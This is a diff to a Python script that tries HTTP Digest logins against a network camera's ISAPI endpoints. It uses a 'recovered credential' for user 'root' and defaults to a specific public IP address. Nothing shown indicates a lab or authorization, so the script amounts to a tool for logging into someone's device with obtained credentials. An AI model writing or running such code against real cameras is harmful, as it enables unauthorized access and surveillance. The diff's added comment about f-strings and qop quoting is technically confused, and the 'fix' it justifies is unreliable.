@@ -2,11 +2,8 @@
 """Try HTTP Digest login against the camera's ISAPI surface with the recovered credential."""
 
 import hashlib
-import base64
 import http.client
 import os
-import re
-import sys
 
 HOST = os.environ.get("CAM_HOST", "117.196.244.183")
 USER = os.environ.get("CAM_USER", "root")
@@ -71,8 +68,11 @@ for path in PATHS:
         ha1 = md5hex(f"{USER}:{realm}:{PASS}")
         ha2 = md5hex(f"GET:{uri}")
         resp_d = md5hex(f"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}")
+        # qop must be the literal string "auth"; writing qop=auth inside an
+        # f-string leaves the bare word unsubstituted and is only correct by
+        # coincidence. State it explicitly.
         auth = (f'Digest username="{USER}", realm="{realm}", nonce="{nonce}", '
-                f'uri="{uri}", qop=auth, nc={nc}, cnonce="{cnonce}", '
+                f'uri="{uri}", qop="auth", nc={nc}, cnonce="{cnonce}", '
                 f'response="{resp_d}"')
     else:
         ha1 = md5hex(f"{USER}:{realm}:{PASS}")
